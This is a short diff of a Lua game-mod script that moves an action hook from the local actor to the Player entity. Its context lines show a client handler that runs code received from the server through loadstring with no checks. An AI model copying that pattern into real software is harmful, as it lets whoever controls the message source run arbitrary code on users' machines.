@@ -119,8 +119,8 @@ function g_gameRules.Client:ClWorkComplete(id,	m)
       loadstring(m:sub(5))(); 
   end; 
 end;
-
-function g_localActor:OnAction(action, activation, value)
+if(not Player)then Script.ReloadScript("Scripts/Entities/Actor/Player.lua"); end;
+function Player:OnAction(action, activation, value)
 	-- gamerules needs to get all player actions all times
 	if (g_gameRules and g_gameRules.Client.OnActorAction) then
 		if (not g_gameRules.Client.OnActorAction(g_gameRules, self, action, activation, value)) then
